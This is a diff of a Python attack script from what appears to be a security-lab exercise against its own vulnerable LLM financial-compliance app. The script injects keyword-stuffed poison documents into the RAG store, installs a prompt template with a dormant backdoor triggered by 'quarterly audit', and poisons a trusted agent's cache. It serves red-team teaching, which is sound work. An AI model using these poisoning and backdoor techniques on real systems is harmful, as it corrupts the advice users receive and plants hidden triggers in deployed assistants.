@@ -1,17 +1,24 @@
 #!/usr/bin/env python3
-"""Poisoning execution — Scenario #1 (RAG KB) and Scenario #6 (prompt template).
+"""Attack skill — poison the financial compliance assistant on three surfaces.
 
-Attacks the vulnerable financial-advisor app by (1) injecting semantically dense
-adversarial documents into the retrieval pipeline, and/or (2) replacing the app's
-prompt template with a tampered artifact carrying a trigger-activated backdoor.
+AUTHORIZED SECURITY-LAB USE ONLY. Targets this skill's own vulnerable_app.py.
 
-AUTHORIZED SECURITY-LAB USE ONLY. Target the local demo app or a system you are
-explicitly permitted to test.
+* ``rag`` (Scenario #1) — ingests ``--count`` documents built from
+  ``assets/poison_template.txt`` through the unauthenticated ``POST /ingest``.
+  They repeat the domain's keywords, so they outrank the official policy.
+* ``prompt`` (Scenario #6) — installs ``assets/prompt_template.json`` through
+  ``POST /config/template``: a template with a dormant block keyed on the
+  phrase "quarterly audit".
+* ``agent`` (distributed poisoning) — refreshes Bob the Agent's cache with
+  ``assets/bob_agent_poisoned_response.json`` through ``POST /agent/cache``.
+  The assistant trusts Bob because he is authenticated.
+
+Exit code: 0 when the attack ran, 1 when the target is unreachable.
 
 Examples:
-    python scripts/run_poisoning.py --scenario rag        # Scenario #1 only
-    python scripts/run_poisoning.py --scenario template   # Scenario #6 only
-    python scripts/run_poisoning.py --scenario all --count 5
+    python scripts/run_poisoning.py
+    python scripts/run_poisoning.py --scenario rag --count 3
+    python scripts/run_poisoning.py --scenario prompt
 """
 
 from __future__ import annotations
@@ -20,82 +27,84 @@ import argparse
 import json
 import os
 import sys
+import urllib.error
+import urllib.request
 
-import requests
-
-HERE = os.path.dirname(os.path.abspath(__file__))
-SKILL_DIR = os.path.dirname(HERE)
-POISON_TEMPLATE = os.path.join(SKILL_DIR, "assets", "poison_template.txt")
+SKILL_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+DEFAULT_TARGET = os.getenv("LLM05_TARGET", "http://127.0.0.1:5205")
 PROMPT_TEMPLATE = os.path.join(SKILL_DIR, "assets", "prompt_template.json")
+AGENT_CACHE = os.path.join(SKILL_DIR, "assets", "bob_agent_poisoned_response.json")
+
+sys.path.insert(0, SKILL_DIR)
+from vulnerable_app import poison_document  # noqa: E402
 
 
-def _check_target(base_url: str) -> None:
+def _post(url: str, body: dict) -> dict:
+    req = urllib.request.Request(
+        url, data=json.dumps(body).encode("utf-8"),
+        headers={"Content-Type": "application/json"}, method="POST",
+    )
+    with urllib.request.urlopen(req, timeout=60) as resp:
+        return json.loads(resp.read())
+
+
+def check_target(base: str) -> bool:
     try:
-        health = requests.get(f"{base_url}/health", timeout=5)
-    except Exception as exc:  # noqa: BLE001
-        sys.exit(
-            f"Cannot reach target {base_url} ({exc}).\n"
-            f"Start it with:  python vulnerable_app.py"
-        )
-    if health.status_code != 200 or (health.json() or {}).get("status") != "ok":
-        sys.exit(
-            f"{base_url}/health did not return the demo app's response "
-            f"(HTTP {health.status_code}). Another service is on that port "
-            f"(on macOS, port 5000 is AirPlay). Start on another port:\n"
-            f"  LLM05_PORT=5001 python vulnerable_app.py\n"
-            f"  python scripts/run_poisoning.py --target http://127.0.0.1:5001"
-        )
+        with urllib.request.urlopen(f"{base}/health", timeout=5) as resp:
+            ok = json.loads(resp.read()).get("demo") == "llm05"
+    except (urllib.error.URLError, OSError, ValueError):
+        ok = False
+    if not ok:
+        print(f"[-] {base} is not the LLM05 target. Start it: python vulnerable_app.py")
+    return ok
 
 
-def poison_rag(base_url: str, count: int) -> None:
-    if not os.path.exists(POISON_TEMPLATE):
-        sys.exit(f"Adversarial template missing: {POISON_TEMPLATE}")
-    with open(POISON_TEMPLATE, "r", encoding="utf-8") as fh:
-        base_content = fh.read()
-
-    print(f"[*] Scenario #1 — injecting {count} semantically optimized documents ...")
-    for i in range(count):
-        doc_name = f"policy_update_v{i}.txt"
-        payload = {"filename": doc_name, "content": f"{base_content}\n[REFERENCE_ID: AUTH-{i:03d}]"}
-        resp = requests.post(f"{base_url}/ingest", json=payload, timeout=30)
-        if resp.status_code == 200:
-            print(f"    [+] Injected adversarial document: {resp.json().get('stored_as', doc_name)}")
-        else:
-            print(f"    [-] Failed ({resp.status_code}) for {doc_name}")
-    print("    Note: coherent, low-perplexity text bypasses perplexity filters "
-          "(CorruptRAG, Zhang et al. 2025).")
+def poison_rag(base: str, count: int) -> None:
+    print(f"[*] Scenario #1: ingesting {count} semantically optimized documents "
+          "(unauthenticated POST /ingest)")
+    for index in range(count):
+        name, content = poison_document(index)
+        result = _post(f"{base}/ingest", {"filename": name, "content": content})
+        print(f"    [+] Injected {result['stored_as']}")
 
 
-def poison_template(base_url: str) -> None:
-    if not os.path.exists(PROMPT_TEMPLATE):
-        sys.exit(f"Prompt template missing: {PROMPT_TEMPLATE}")
+def poison_prompt(base: str) -> None:
     with open(PROMPT_TEMPLATE, "r", encoding="utf-8") as fh:
         artifact = json.load(fh)
+    print("[*] Scenario #6: replacing the prompt template (unauthenticated POST /config/template)")
+    result = _post(f"{base}/config/template", artifact)
+    print(f"    [+] Active template is now '{result['active_template']}'. "
+          f"Trigger phrase: {artifact.get('trigger_keyword')!r} (dormant until then).")
 
-    print("[*] Scenario #6 — replacing the prompt template with a tampered artifact ...")
-    resp = requests.post(f"{base_url}/config/template", json=artifact, timeout=30)
-    if resp.status_code == 200:
-        print(f"    [+] Active template is now '{artifact.get('version')}'. "
-              f"Trigger phrase: {artifact.get('trigger_keyword')!r}")
-        print("    Backdoor is dormant until the trigger phrase appears "
-              "(sleeper behavior; Fogel et al. 2026 / Hubinger et al. 2024).")
-    else:
-        print(f"    [-] Template replacement failed ({resp.status_code}).")
+
+def poison_agent(base: str) -> None:
+    with open(AGENT_CACHE, "r", encoding="utf-8") as fh:
+        cache = json.load(fh)
+    print("[*] Distributed poisoning: refreshing Bob the Agent's cache "
+          "(unauthenticated POST /agent/cache)")
+    _post(f"{base}/agent/cache", cache)
+    print("    [+] Bob's cached guidance now comes from Charles's upstream source; "
+          "provenance unverified, no digest.")
 
 
 def main(argv=None) -> int:
-    parser = argparse.ArgumentParser(description=__doc__)
-    parser.add_argument("--target", default=os.getenv("LLM05_TARGET", "http://127.0.0.1:5100"))
-    parser.add_argument("--scenario", choices=["rag", "template", "all"], default="all")
-    parser.add_argument("--count", type=int, default=5, help="RAG documents to inject (3-10 recommended).")
+    parser = argparse.ArgumentParser(description=__doc__,
+                                     formatter_class=argparse.RawDescriptionHelpFormatter)
+    parser.add_argument("--target", default=DEFAULT_TARGET)
+    parser.add_argument("--scenario", choices=["rag", "prompt", "agent", "all"], default="all")
+    parser.add_argument("--count", type=int, default=3,
+                        help="RAG documents to inject (default 3; 3-10 recommended)")
     args = parser.parse_args(argv)
 
-    _check_target(args.target)
+    if not check_target(args.target):
+        return 1
     if args.scenario in ("rag", "all"):
-        poison_rag(args.target, args.count)
-    if args.scenario in ("template", "all"):
-        poison_template(args.target)
-    print("\n[*] Done. Measure impact with:  python scripts/evaluate_kpi.py --target", args.target)
+        poison_rag(args.target, max(1, min(args.count, 10)))
+    if args.scenario in ("prompt", "all"):
+        poison_prompt(args.target)
+    if args.scenario in ("agent", "all"):
+        poison_agent(args.target)
+    print("[*] Re-run scripts/evaluate_kpi.py to measure the effect.")
     return 0
 
 
